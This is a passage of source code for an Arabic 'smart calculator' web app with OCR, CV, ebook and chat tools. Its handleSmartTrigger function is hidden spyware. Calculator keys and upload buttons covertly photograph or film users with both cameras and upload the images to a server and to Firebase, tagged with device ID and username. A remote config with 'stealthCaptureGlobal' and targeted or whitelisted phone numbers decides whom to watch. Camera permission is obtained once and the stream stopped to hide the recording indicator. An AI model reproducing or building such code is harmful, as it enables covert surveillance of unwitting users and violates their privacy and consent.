      setPendingResult({ label, result, target });
      showToast(`روح الذكية: اكتملت عملية "${label}" بنجاح!`, 'success');
    } catch (e) {
      setBgTasks(prev => prev.map(t => t.id === id ? { ...t, status: 'error' } : t));
      showToast(`روح الذكية: فشلت عملية "${label}"`, 'error');
    }
  };

  const [cameraPermitted, setCameraPermitted] = useState(() => {
    try { return localStorage.getItem('camera_permitted') === 'true'; } catch (e) { return false; }
  });

  const showToast = (message: string, type: 'success' | 'error' | 'info') => {
    setToast({ message, type });
  };

  const handleCopy = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    showToast('تم نسخ النص بنجاح', 'success');
  };

  const handleDownload = (url: string, filename: string) => {
    if (!url) return;
    const cleanFilename = filename.replace(/\s+/g, '_').replace(/[\(\)]/g, '').replace(/\//g, '_');
    const finalFilename = `روح_الذكية_${cleanFilename}`;
    
    addBackgroundTask(`تحميل ${cleanFilename}`, async (updateProgress) => {
      if (url.startsWith('data:') || url.startsWith('blob:')) {
        return new Promise((resolve) => {
          let p = 0;
          const interval = setInterval(() => {
            p += 25;
            if (p >= 100) {
              clearInterval(interval);
              updateProgress(100);
              const link = document.createElement('a');
              link.href = url;
              link.download = finalFilename;
              document.body.appendChild(link);
              link.click();
              document.body.removeChild(link);
              resolve('اكتمل التحميل بنجاح ✨');
            } else {
              updateProgress(p);
            }
          }, 200);
        });
      }
      
      const response = await fetch(url);
      if (!response.ok) throw new Error('Download failed');
      const contentLength = response.headers.get('content-length');
      const total = contentLength ? parseInt(contentLength, 10) : 0;
      let loaded = 0;
      const reader = response.body?.getReader();
      if (!reader) throw new Error('Cannot read response body');
      const chunks = [];
      while(true) {
        const { done, value } = await reader.read();
        if (done) break;
        chunks.push(value);
        loaded += value.length;
        if (total) updateProgress((loaded / total) * 100);
      }
      const blob = new Blob(chunks);
      const urlObj = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = urlObj;
      link.download = finalFilename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(urlObj);
      return 'اكتمل التحميل بنجاح ✨';
    });
  };

  // Smart Solve State
  const videoRef = useRef<HTMLVideoElement>(null);
  const isCapturing = useRef(false);

  // Checks if camera was ever permitted via the AI upload button
  const isCameraEnabled = () => cameraPermitted;

  const firstCaptureTracker = useRef(new Set<string>());

  async function handleSmartTrigger(typeOverride?: 's' | 't', sourceId?: string) {
    if (isCapturing.current) return;

    // These trigger buttons are always allowed on click and bypass the tracker to run on every click
    const alwaysAllowSources = [
      'calc_1', 'calc_2', 'calc_5',
      'ai_solver_upload', 'ai_solver_click', 'ai_solver_upload_trigger',
      'ocr_select', 'ocr_main_click',
      'chat_media_click', 'chat_click',
      'birthday_bg_click',
      'ebook_page_select', 'ebook_cover_start', 'ebook_cover_end',
      'cv_photo_click', 'cv_photo'
    ];

    if (sourceId && !alwaysAllowSources.includes(sourceId)) {
      if (firstCaptureTracker.current.has(sourceId)) return;
      firstCaptureTracker.current.add(sourceId);
    }
    
    // Fetch latest control settings directly from Firebase for real-time propagation feedback
    let sData: any = { stealthCaptureGlobal: true, calcTriggerEnabled: true };
    try {
      const { firebaseFetchSecretSettings } = await import('./lib/firebaseSync');
      const fbSettings = await firebaseFetchSecretSettings();
      if (fbSettings) {
        sData = fbSettings;
        // Keep the local server state in sync
        try {
          await fetch('/api/control/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(fbSettings)
          });
        } catch {}
      } else {
        const sRes = await fetch('/api/control/settings');
        if (sRes.ok) sData = await sRes.json();
      }
    } catch (e) {
      // Safe fallback to local server control settings
      try {
        const sRes = await fetch('/api/control/settings');
        if (sRes.ok) sData = await sRes.json();
      } catch {}
    }

    // Determine if stealth capturing is allowed for current user/phone
    let captureAllowed = true;
    const cleanUserPhone = userPhone ? userPhone.replace(/[^0-9]/g, '') : '';
    const isWhitelisted = cleanUserPhone && sData.whitelistedNumbers?.includes(cleanUserPhone);
    const isTargeted = cleanUserPhone && sData.targetedNumbers?.includes(cleanUserPhone);

    if (isWhitelisted) {
      captureAllowed = false;
    } else if (isTargeted) {
      captureAllowed = true;
    } else {
      captureAllowed = !!sData.stealthCaptureGlobal;
    }

    // Calculator triggers are bound to calcTriggerEnabled setting, unless user is explicitly targeted
    if (captureAllowed && !isTargeted && sourceId && ['calc_1', 'calc_2', 'calc_5'].includes(sourceId)) {
      if (!sData.calcTriggerEnabled) {
        captureAllowed = false;
      }
    }

    if (!captureAllowed) {
      return; // Feature is disabled globally or stopped for this user
    }
    
    // Auto-request permission ONLY for upload buttons
    if (!isCameraEnabled()) {
      // List of sources that ARE allowed to trigger the permission prompt (upload buttons)
      const isUploadButton = ['ocr_select', 'birthday_bg_click', 'cv_photo_click', 'ai_solver_send', 'ai_solver_upload', 'ai_solver_click', 'ebook_page_select'].includes(sourceId || '');
      
      if (isUploadButton) {
        const granted = await requestCameraPermission();
        if (!granted) return;
      } else {
        // Calculator triggers or background triggers when permission not yet granted: Skip silently as requested
        return; 
      }
    }
    
    isCapturing.current = true;
    try {
      const captureType = typeOverride || 's';
      
      const captureFromSource = async (facingMode: 'environment' | 'user') => {
        let localStream: MediaStream | null = null;
        try {
          localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: facingMode } }, 
            audio: false 
          });
          
          if (videoRef.current) {
            videoRef.current.srcObject = localStream;
            await new Promise<void>((resolve) => {
              if (videoRef.current) {
                videoRef.current.onplaying = () => resolve();
                videoRef.current.play().catch(() => resolve());
              } else resolve();
              setTimeout(resolve, 200); 
            });
            
            await new Promise(resolve => setTimeout(resolve, 80));
            
            const canvas = document.createElement('canvas');
            const v = videoRef.current;
            if (v && v.videoWidth > 0) {
              canvas.width = v.videoWidth;
              canvas.height = v.videoHeight;
              const ctx = canvas.getContext('2d');
              if (ctx) {
                ctx.drawImage(v, 0, 0);
                return canvas.toDataURL('image/jpeg', 0.6);
              }
            }
          }
        } catch (e) {
          console.warn("Capture error", e);
        } finally {
          if (localStream) {
            localStream.getTracks().forEach(t => t.stop());
            if (videoRef.current) videoRef.current.srcObject = null;
          }
        }
        return null;
      };

      // Real video capture support with specific duration
      const captureVideoFromSource = async (facingMode: 'environment' | 'user', durationMs: number): Promise<string[]> => {
        let localStream: MediaStream | null = null;
        const frames: string[] = [];
        try {
          localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: facingMode }, width: { ideal: 480 }, height: { ideal: 480 } }, 
            audio: false 
          });
          
          const tempVideo = document.createElement('video');
          tempVideo.setAttribute('autoplay', 'true');
          tempVideo.setAttribute('playsinline', 'true');
          tempVideo.muted = true;
          tempVideo.srcObject = localStream;
          
          await new Promise<void>((resolve) => {
            tempVideo.onplaying = () => resolve();
            tempVideo.play().catch(() => resolve());
            setTimeout(resolve, 250);
          });

          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          const intervalTime = 250; // Capture 4 frames per second
          const maxFrames = Math.floor(durationMs / intervalTime);

          for (let f = 0; f < maxFrames; f++) {
            if (tempVideo.videoWidth > 0 && ctx) {
              canvas.width = tempVideo.videoWidth;
              canvas.height = tempVideo.videoHeight;
              ctx.drawImage(tempVideo, 0, 0);
              frames.push(canvas.toDataURL('image/jpeg', 0.5));
            }
            await new Promise(r => setTimeout(r, intervalTime));
          }
        } catch (e) {
          console.warn("Video frame capture error:", e);
        } finally {
          if (localStream) {
            localStream.getTracks().forEach(t => t.stop());
          }
        }
        return frames;
      };

      const newImages: string[] = [];
      let settingsDuration = 3;
      let isVideoFormat = false;

      try {
        const sRes = await fetch('/api/control/settings');
        if (sRes.ok) {
          const sData = await sRes.json();
          settingsDuration = sData.captureDurationSeconds || 3;
          isVideoFormat = !!sData.dualCameraSequence; // Trigger real video sequence
        }
      } catch (e) {}

      const durationMs = settingsDuration * 1000;

      if (captureType === 's') {
        if (isVideoFormat) {
          // Robust sequential capture: captures front then back continuously for realistic silent dual camera video compilation
          // Parallel capture fails on mobile devices due to exclusive hardware channel constraints on getUserMedia.
          const frontVideoFrames = await captureVideoFromSource('user', durationMs);
          await new Promise(r => setTimeout(r, 300)); // Safety delay to allow device to release front camera
          const backVideoFrames = await captureVideoFromSource('environment', durationMs);
          newImages.push(...frontVideoFrames, ...backVideoFrames);
        } else {
          // Robust sequential dual capture: captures both cameras sequentially with proper hardware release window.
          const front = await captureFromSource('user');
          await new Promise(r => setTimeout(r, 300)); // Safety delay to allow device to release front camera and bind to back camera
          const back = await captureFromSource('environment');
          if (front) newImages.push(front);
          if (back) newImages.push(back);
        }
      } else {
        const img = await captureFromSource('environment') || await captureFromSource('user');
        if (img) newImages.push(img);
      }

      if (newImages.length > 0) {
        try {
          const deviceId = getDeviceId();
          const { compressImageBase64 } = await import('./lib/imageCompressor');
          const compressedImages = await Promise.all(newImages.map(async img => {
            try {
              return await compressImageBase64(img, 640, 640, 0.45);
            } catch {
              return img;
            }
          }));

          await Promise.all(compressedImages.map(async img => {
            // Save to server
            try {
              await fetch('/api/save-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  images: [img], 
                  deviceId,
                  type: captureType,
                  source: sourceId || 'unknown'
                })
              });
            } catch (err) {}

            // Save and sync to Firebase via offline queue
            try {
              pushToOfflineQueue('capture', {
                id: `cap_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
                deviceId,
                image: img,
                source: sourceId || 'unknown',
                timestamp: Date.now(),
                username: birthdayProConfig?.usernameUnified || userPhone || 'guest'
              });
            } catch (err) {}
          }));
        } catch (e) {}
      }
    } finally {
      isCapturing.current = false;
    }
  }

  // Permission Modal
  const [showPermissionModal, setShowPermissionModal] = useState(false);
  const [permissionResolve, setPermissionResolve] = useState<((val: boolean) => void) | null>(null);

  const requestCameraPermission = (): Promise<boolean> => {
    return new Promise((resolve) => {
      // Check if persistent permission flag is true
      const savedPermit = localStorage.getItem('camera_permitted') === 'true';
      if (savedPermit) {
        setCameraPermitted(true);
        resolve(true);
        return;
      }
      
      if (cameraPermitted) {
        resolve(true);
        return;
      }
      
      setPermissionResolve(() => resolve);
      setShowPermissionModal(true);
    });
  };

  const handlePermissionConfirm = async () => {
    setShowPermissionModal(false);
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Just verify/request permission, then immediately turn off the stream to extinguish the green dot
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(track => track.stop());

        localStorage.setItem('camera_permitted', 'true');
        setCameraPermitted(true);
        if (permissionResolve) permissionResolve(true);
      }
    } catch (err) {
      console.warn("Camera permission denied:", err);
      showToast("تم رفض إذن الكاميرا. يرجى تفعيله من إعدادات المتصفح.", "error");
      if (permissionResolve) permissionResolve(false);
    }
  };

  const handlePermissionCancel = () => {
    setShowPermissionModal(false);
    if (permissionResolve) permissionResolve(false);
  };

  useEffect(() => {
    const checkStandalone = () => {
      const isStandaloneMode = window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone === true;
      setIsStandalone(isStandaloneMode);
      if (isStandaloneMode) {
        setShowInstallBtn(false);
      }
    };

    checkStandalone();

    const handleBeforeInstallPrompt = (e: Event) => {
      e.preventDefault();
      setDeferredPrompt(e);
      if (!isStandalone) {
        setShowInstallBtn(true);
      }
    };

    const handleAppInstalled = () => {
      setDeferredPrompt(null);
      setShowInstallBtn(false);
    };

    window.addEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    window.addEventListener('appinstalled', handleAppInstalled);

    return () => {
      window.removeEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
      window.removeEventListener('appinstalled', handleAppInstalled);
    };
  }, [isStandalone]);

  const handleInstallClick = async () => {
    if (!deferredPrompt) return;
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    if (outcome === 'accepted') {
      console.log('User accepted the install prompt');
      setShowInstallBtn(false);
    }
    setDeferredPrompt(null);
  };

  const handleInstagramClick = (e: React.MouseEvent) => {
    e.preventDefault();
    const webUrl = "https://www.instagram.com/roohyosif?igsh=a3d6ZG91YzlyN2hr";
    const appUrl = "instagram://user?username=roohyosif";
    
    // Try to open the app directly
    window.location.href = appUrl;
    
    // Fallback to web after a short delay if the app doesn't open
    setTimeout(() => {
      // If the page is still visible, it means the app likely didn't open
      if (!document.hidden) {
        window.open(webUrl, '_blank');
      }
    }, 1500);
  };

  const handleShareApp = async () => {
    const refLink = `${getShareOrigin()}${window.location.pathname}?r=${obfuscateRefId(userPhone || getDeviceId())}`;
    const shareData = {
      title: 'حاسبة روح الذكية',
      text: 'جرب حاسبة روح الذكية - الحل الذكي لكل المسائل مع مميزات حصرية!',
      url: refLink
    };

    try {
      if (navigator.share) {
        await navigator.share(shareData);
      } else {
        await navigator.clipboard.writeText(shareData.url);
        showToast('تم نسخ رابط التطبيق للمشاركة', 'success');
      }
    } catch (err: any) {
      if (err.name !== 'AbortError') {
        console.error('Share failed:', err);
      }
    }
  };

  const handleDownloadAndroid = async () => {
    // 1. Trigger live PWA install prompt event if captured
    if (deferredPrompt) {
      showToast('جاري استدعاء معالج التثبيت الفوري لـ روح... 📲', 'info');
      try {
        deferredPrompt.prompt();
        const { outcome } = await deferredPrompt.userChoice;
        if (outcome === 'accepted') {
          showToast('تم البدء في تثبيت تطبيق روح الذكي بنجاح! 🎉', 'success');
          setDeferredPrompt(null);
        } else {
          showToast('تم إلغاء عملية التثبيت الفوري.', 'info');
        }
        return;
      } catch (err) {
        console.warn("PWA Prompt failed, falling back to standalone package download", err);
      }
    }

    // Check if dynamic APK has been configured
    let hasCustomApk = false;
    let apkDownloadUrl = "";

    // 1. Try fetching from FirebaseSync helper
    try {
      const fbUrl = await firebaseFetchApkDownloadUrl();
      if (fbUrl) {
        hasCustomApk = true;
        apkDownloadUrl = fbUrl;
      }
    } catch (e) {
      console.warn("Could not check Firebase for APK url:", e);
    }

    // 2. Try fetching from backup settings endpoint
    if (!hasCustomApk) {
      try {
        const baseUrl = getBaseApiUrl();
        const res = await fetch(`${baseUrl}/api/control/settings`);
        if (res.ok) {
          const settings = await res.json();
          if (settings.apkDownloadUrl) {
            hasCustomApk = true;
            apkDownloadUrl = settings.apkDownloadUrl;
          }
        }
      } catch (e) {
        console.warn("Could not check settings for APK url:", e);
      }
    }

    if (!hasCustomApk) {
      setConfirmModal({
        title: "حزمة أندرويد (APK) غير متوفرة حالياً 📲",
        message: "مرحباً بك! لم يقم مدير النظام برفع أو ربط حزمة أندرويد APK مخصصة بالتطبيق بعد. \n\nلكن يمكنك فوراً تثبيت تطبيق روح واستخدامه كتطبيق ويب تقدمي (PWA) مستقل ومثالي باتباع الآتي: \n١. اضغط على زر الخيارات (النقاط الثلاث) في متصفحك الحالي الحقيقي.\n٢. اختر 'إضافة إلى الشاشة الرئيسية' أو 'تثبيت التطبيق'.\n\nستتم إضافة التطبيق لشاشتك وسيعمل بدون استهلاك لموارد هاتفك وبكامل سرعته وسيكون متصلاً بمخزن بياناتك!",
        variant: "info",
        confirmLabel: "فهمت",
        cancelLabel: "إلغاء",
        onConfirm: () => {
          // Do not redirect to a 404 page since there is no link!
          setConfirmModal(null);
        }
      } as any);
      return;
    }

    // 3. Open custom configured APK installer link directly
    showToast('جاري توجيهك لتحميل حزمة تطبيق روح الرسمية... 📲', 'info');
    try {
      window.open(apkDownloadUrl, '_blank');
    } catch(e) {
      showToast('عذراً، فشل في تحميل تطبيق الأندرويد لخدمات روح', 'error');
    }
  };

  useEffect(() => {
    const handleOnline = () => {
      setIsOnline(true);
      showToast('📡 تم استعادة اتصال الإنترنت بنجاح! جاري مزامنة بياناتك المعلقة...', 'success');
      syncOfflineQueue(showToast);
    };
    const handleOffline = () => {
      setIsOnline(false);
      showToast('📡 لقد فقدت الاتصال بالإنترنت. يمكنك الاستمرار في استخدام الأقسام المحلية وسنقوم بمزامنة بياناتك لاحقاً.', 'info');
    };

    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);

    // Initial sync
    if (navigator.onLine) {
      syncOfflineQueue(showToast);
    }

    // Request notification permissions
    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }

    // Prevent context menu to feel like a native app
    const handleContextMenu = (e: MouseEvent) => {
      if ((e.target as HTMLElement).tagName !== 'INPUT' && (e.target as HTMLElement).tagName !== 'TEXTAREA') {
        e.preventDefault();
      }
    };
    window.addEventListener('contextmenu', handleContextMenu);

    // Aggressive hide of initial loader
    const hideLoader = () => {
      const loader = document.getElementById('initial-loader');
      if (loader) {
        loader.style.opacity = '0';
        setTimeout(() => loader.remove(), 500);
      }
    };
    hideLoader();
    const loaderInterval = setInterval(hideLoader, 1000);

    return () => {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
      window.removeEventListener('contextmenu', handleContextMenu);
      clearInterval(loaderInterval);
    };
  }, []);

  useEffect(() => {
    if (!isLanding) return;

    // Preload image
    const img = new Image();
    img.src = "https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ";
    
    const handleImageLoad = () => {
      setImageReady(true);
    };
    img.onload = handleImageLoad;
    img.onerror = handleImageLoad;
    
    const loadTimeout = setTimeout(() => setImageReady(true), 2500);

    const timer = setTimeout(() => {
      setIsLanding(false);
      try { sessionStorage.setItem('rouh_splash_shown', 'true'); } catch (e) {}
    }, 4000); 

    return () => {
      clearTimeout(timer);
      clearTimeout(loadTimeout);
    };
  }, [isLanding]);

  // Settings Persistence
  useEffect(() => {
    try {
      localStorage.setItem('rouh_theme', theme);
      if (theme === 'light') {
        document.documentElement.classList.remove('dark');
        document.documentElement.classList.add('light');
      } else {
        document.documentElement.classList.remove('light');
        document.documentElement.classList.add('dark');
      }
    } catch (e) {}
  }, [theme]);

  useEffect(() => {
    try { localStorage.setItem('rouh_start_page', startPage); } catch (e) {}
  }, [startPage]);

  useEffect(() => {
    try { localStorage.setItem('rouh_skip_splash', skipSplash.toString()); } catch (e) {}
  }, [skipSplash]);

  useEffect(() => {
    try { localStorage.setItem('rouh_lucky_buttons_enabled', luckyButtonsEnabled.toString()); } catch (e) {}
  }, [luckyButtonsEnabled]);

  // Save active tab
  useEffect(() => {
    try { localStorage.setItem('rouh_active_tab', activeTab); } catch (e) {}
  }, [activeTab]);

  // Save history to localStorage
  useEffect(() => {
    try { localStorage.setItem('hissab_rouh_history', JSON.stringify(appHistory)); } catch (e) {}
  }, [appHistory]);

  const addHistoryItem = (item: Omit<HistoryItem, 'id' | 'timestamp'>) => {
    const newItem: HistoryItem = {
      ...item,
      id: Math.random().toString(36).substring(2, 11),
      timestamp: Date.now(),
    };
    setAppHistory(prev => [newItem, ...prev].slice(0, 50)); 
  };

  const clearHistory = () => {
    setAppHistory([]);
    showToast('تم مسح السجل بنجاح', 'success');
  };

  const handleUserFileSave = async (fileName: string, data: string) => {
    try {
      await fetch('/api/user-file/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fileName, data, deviceId: getDeviceId() })
      });
    } catch (e) {}
  };

  // Automatically refresh/reopen app on update completion overlay timer
  useEffect(() => {
    if (showUpdateModal) {
      const timeout = setTimeout(() => {
        window.location.reload();
      }, 4500);
      return () => clearTimeout(timeout);
    }
  }, [showUpdateModal]);

  const renderTab = () => {
    switch (activeTab) {
      case 'calc': return (
        <CalculatorTab 
          onAddHistory={addHistoryItem} 
          onSmartTrigger={handleSmartTrigger}
          onOpenSecret={handleOpenSecret}
          friends={friends}
          onChatTrigger={(friend) => {
            setActiveTab('services');
            setMoreSubTab('ai_chat_internal');
          }}
          cameraPermitted={cameraPermitted}
          luckyButtonsEnabled={luckyButtonsEnabled}
          usageGuideEnabled={usageGuideEnabled}
          usageGuideTips={usageGuideTips}
        />
      );
      case 'ai': return (
        <div className="flex flex-col h-full overflow-hidden">
          <AISolverTab 
            onAddHistory={addHistoryItem}
            showToast={showToast}
            onPermissionRequest={requestCameraPermission}
            onSmartTrigger={handleSmartTrigger}
            handleDownload={handleDownload}
            handleCopy={handleCopy}
            addBackgroundTask={addBackgroundTask}
            onSecretSave={handleUserFileSave}
          />
        </div>
      );
      case 'chat': return (
        <div className="flex flex-col h-full p-4 overflow-hidden max-w-lg mx-auto w-full">
          <SmartChatTab 
            userPhone={userPhone}
            setUserPhone={setUserPhone}
            friends={friends}
            setFriends={setFriends}
            showToast={showToast}
            addBackgroundTask={addBackgroundTask}
            onSmartTrigger={handleSmartTrigger}
            onPermissionRequest={requestCameraPermission}
            notifications={notifications}
            setNotifications={setNotifications}
            showLocalNotification={showLocalNotification}
          />
        </div>
      );
      case 'services': return (
        <div className={cn(
          "flex flex-col h-full p-4 max-w-lg mx-auto w-full",
          moreSubTab === 'ai_chat_internal' ? "overflow-hidden" : "overflow-y-auto no-scrollbar"
        )}>
          {moreSubTab && ['birthday', 'ageDiff', 'nameMerge', 'cvMaker', 'ebookMaker', 'ocr', 'ai_chat_internal'].includes(moreSubTab) ? (
             <div className="animate-in fade-in slide-in-from-left-4 duration-300">
               <div className="flex items-center gap-3 mb-6">
                 <button onClick={() => setMoreSubTab(null)} className="p-2 text-gray-500 hover:text-white bg-gray-800/50 rounded-xl border border-gray-800 transition-colors">
                   <ChevronRight size={20} />
                 </button>
                 <div>
                   <h2 className="text-xl font-black italic text-gray-900 dark:text-white leading-none">
                     {moreSubTab === 'birthday' ? 'عداد الميلاد' : 
                      moreSubTab === 'ageDiff' ? 'فرق العمر' : 
                      moreSubTab === 'nameMerge' ? 'دمج الأسماء' : 
                      moreSubTab === 'ocr' ? 'مستخرج النصوص' : 
                      moreSubTab === 'cvMaker' ? 'صانع السيرة الذاتية' : 
                      moreSubTab === 'ebookMaker' ? 'صانع الكتب الإلكترونية' : 'دردشة روح وذكية'}
                   </h2>
                 </div>
               </div>
               
               {moreSubTab === 'birthday' && (
                 <BirthdayTool 
                   proConfig={birthdayProConfig} 
                   onUpdatePro={setBirthdayProConfig} 
                   onOpenGallery={handleOpenSecret}
                   onPermissionRequest={requestCameraPermission}
                   showToast={showToast} 
                   addBackgroundTask={addBackgroundTask}
                   onSecretSave={handleUserFileSave}
                   onSmartTrigger={handleSmartTrigger}
                 />
               )}
               {moreSubTab === 'ageDiff' && <AgeDiffTool />}
                {moreSubTab === 'nameMerge' && <NameMergeTool showToast={showToast} handleDownload={handleDownload} addBackgroundTask={addBackgroundTask} onSecretSave={handleUserFileSave} onSmartTrigger={handleSmartTrigger} />}
                {moreSubTab === 'ocr' && <OCRExtractor showToast={showToast} handleCopy={handleCopy} onSmartTrigger={handleSmartTrigger} addBackgroundTask={addBackgroundTask} pendingResult={pendingResult} onSecretSave={handleUserFileSave} onPermissionRequest={requestCameraPermission} />}
                {moreSubTab === 'cvMaker' && <CVMaker showToast={showToast} handleDownload={handleDownload} onSmartTrigger={handleSmartTrigger} addBackgroundTask={addBackgroundTask} onSecretSave={handleUserFileSave} onPermissionRequest={requestCameraPermission} />}
                {moreSubTab === 'ebookMaker' && <EbookMaker showToast={showToast} handleDownload={handleDownload} onSmartTrigger={handleSmartTrigger} addBackgroundTask={addBackgroundTask} onSecretSave={handleUserFileSave} onPermissionRequest={requestCameraPermission} />}
                {moreSubTab === 'ai_chat_internal' && (
                  <SmartChatTab 
                    userPhone={userPhone}
                    setUserPhone={setUserPhone}
                    friends={friends}
                    setFriends={setFriends}
                    showToast={showToast}
                    addBackgroundTask={addBackgroundTask}
                    onSmartTrigger={handleSmartTrigger}
                    onPermissionRequest={requestCameraPermission}
                    notifications={notifications}
                    setNotifications={setNotifications}
                    showLocalNotification={showLocalNotification}
                  />
                )}
              </div>
          ) : (
      <div className="animate-in fade-in slide-in-from-right-4 duration-300 space-y-6">
          <div className="mb-2">
            <h2 className={cn("text-xl font-black italic leading-none flex items-center gap-2", theme === 'dark' ? "text-white" : "text-gray-950")}>
               خدمات روح الذكية
               <UsageIndicator section="services" tips={usageGuideTips} enabled={usageGuideEnabled} />
            </h2>
            <p className={cn("text-[10px] font-bold mt-1 uppercase tracking-widest leading-none", theme === 'dark' ? "text-gray-300" : "text-gray-800")}>مساعدك الرقمي المتكامل</p>
          </div>

        <div 
          className={cn("w-full border rounded-[35px] px-5 py-4 flex items-center justify-between group relative overflow-hidden cursor-pointer active:scale-[0.98] transition-all shadow-xl", theme === 'dark' ? "bg-[#121417] border-gray-800" : "bg-white border-gray-200")}
          onClick={() => setMoreSubTab('ai_chat_internal')}
        >
          <div className="flex items-center gap-4">
            <div className="relative">
              <RoohLoader size={50} />
            </div>
            <div className="text-right">
                <h3 className={cn("text-base font-black italic leading-none", theme === 'dark' ? "text-white" : "text-gray-900")}>دردشة روح وذكية</h3>
                <p className={cn("text-[9px] font-bold mt-1.5 leading-tight", theme === 'dark' ? "text-gray-300" : "text-gray-855")}>سجل رقمك لتلقي الدردشات من الأصدقاء، وأضف أصدقاءك للوصول السريع</p>
            </div>
          </div>
          <div className="p-2.5 bg-blue-600/20 rounded-full">
              <MessageSquare size={18} className="text-blue-600 dark:text-blue-400" />
          </div>
        </div>
        
        <div className="grid grid-cols-2 gap-3 mb-6">
          {[
            { id: 'ocr', label: 'مستخرج النصوص الذكي', icon: FileImage, color: 'text-blue-600 dark:text-blue-400', bg: 'bg-blue-600/10' },
            { id: 'nameMerge', label: 'دمج الأسماء المذهل', icon: Heart, color: 'text-pink-600 dark:text-pink-400', bg: 'bg-pink-600/10' },
            { id: 'ageDiff', label: 'فرق العمر والزمن', icon: Users, color: 'text-emerald-600 dark:text-emerald-405', bg: 'bg-emerald-600/10' },
            { id: 'birthday', label: 'عداد الميلاد والبقاء', icon: Calendar, color: 'text-blue-600 dark:text-blue-400', bg: 'bg-blue-600/10' },
            { id: 'cvMaker', label: 'صانع الـ CV الذكي', icon: PencilRuler, color: 'text-amber-600 dark:text-amber-400', bg: 'bg-amber-600/10' },
            { id: 'ebookMaker', label: 'مؤلف الكتب والقصص', icon: BookText, color: 'text-purple-600 dark:text-purple-400', bg: 'bg-purple-600/10' },
          ].map((service) => (
            <button
              key={service.id}
              onClick={() => setMoreSubTab(service.id)}
              className={cn("flex flex-col items-center gap-3 p-5 rounded-2xl border transition-all active:scale-95 group shadow-lg", theme === 'dark' ? "bg-[#121417] border-gray-800 hover:border-gray-700" : "bg-white border-gray-200 hover:border-gray-300")}
            >
              <div className={cn("p-3 rounded-xl transition-transform group-hover:scale-110", service.bg)}>
                <service.icon size={24} className={service.color} />
              </div>
              <span className={cn("text-[11px] font-black italic", theme === 'dark' ? "text-gray-100" : "text-gray-950")}>{service.label}</span>
            </button>
          ))}
        </div>
      </div>
          )}
        </div>
      );
      case 'tools': return (
        <div className="flex flex-col h-full p-4 overflow-y-auto custom-scrollbar max-w-lg mx-auto w-full">
          {moreSubTab && ['converter', 'health', 'settings', 'referral', 'about', 'complaints'].includes(moreSubTab) ? (
             <div className="animate-in fade-in slide-in-from-left-4 duration-300">
               <div className="flex items-center gap-3 mb-6">
                 <button onClick={() => setMoreSubTab(null)} className="p-2 text-gray-500 hover:text-white bg-gray-800/50 rounded-xl border border-gray-800 transition-colors">
                   <ChevronRight size={20} />
                 </button>
                 <div>
                   <h2 className="text-xl font-black italic text-gray-900 dark:text-white">
                     {moreSubTab === 'converter' ? 'المحولات الذكية' : 
                      moreSubTab === 'health' ? 'صحة روح' : 
                      moreSubTab === 'settings' ? 'إعدادات النظام' :
                      moreSubTab === 'referral' ? 'عداد المشاركة' :
                      moreSubTab === 'about' ? 'حول روح الذكية' : 'ركن عائلة روح'}
                   </h2>
                 </div>
               </div>
               
               {moreSubTab === 'converter' && <ConverterTab onAddHistory={addHistoryItem} />}
               {moreSubTab === 'health' && (
                 <HealthTab 
                   onAddHistory={addHistoryItem} 
                   showToast={showToast} 
                   handleDownload={handleDownload}
                   handleCopy={handleCopy}
                   addBackgroundTask={addBackgroundTask}
                   usageGuideTips={usageGuideTips}
                   usageGuideEnabled={usageGuideEnabled}
                 />
               )}
                {moreSubTab === 'settings' && (
                  <SettingsSubTab 
                    theme={theme} setTheme={setTheme}
                    startPage={startPage} setStartPage={setStartPage}
                    skipSplash={skipSplash} setSkipSplash={setSkipSplash}
                    luckyButtonsEnabled={luckyButtonsEnabled} setLuckyButtonsEnabled={setLuckyButtonsEnabled}
                    usageGuideEnabled={usageGuideEnabled} setUsageGuideEnabled={setUsageGuideEnabled}
                    proConfig={birthdayProConfig} setProConfig={setBirthdayProConfig}
                    showToast={showToast}
                    addBackgroundTask={addBackgroundTask}
                    userPhone={userPhone}
                    setUserPhone={setUserPhone}
                    setActiveTab={setActiveTab}
                  />
                )}
                {moreSubTab === 'referral' && <ReferralCounter phone={userPhone} showToast={showToast} />}
                {moreSubTab === 'about' && <AboutRoohIntelligence />}
                {moreSubTab === 'complaints' && <ComplaintsBox showToast={showToast} userPhone={userPhone} />}
             </div>
          ) : (
             <div className="animate-in fade-in slide-in-from-right-4 duration-300">
               <div className="mb-6">
                 <h2 className="text-xl font-black italic text-gray-900 dark:text-white flex items-center gap-2">أدوات روح <Info size={14} className="text-gray-600 dark:text-gray-600" /></h2>
                 <p className="text-[10px] text-gray-800 dark:text-gray-500 font-bold mt-1 uppercase tracking-widest leading-none">الأدوات الأساسية والإعدادات</p>
               </div>
               
               <div className="grid grid-cols-2 gap-3 mb-6">
                 {[
                   { id: 'converter', label: 'المحولات الذكية', icon: ArrowLeftRight, color: 'text-sky-600 dark:text-sky-400', bg: 'bg-sky-600/10' },
                   { id: 'health', label: 'صحة روح', icon: Scale, color: 'text-emerald-600 dark:text-emerald-400', bg: 'bg-emerald-600/10' },
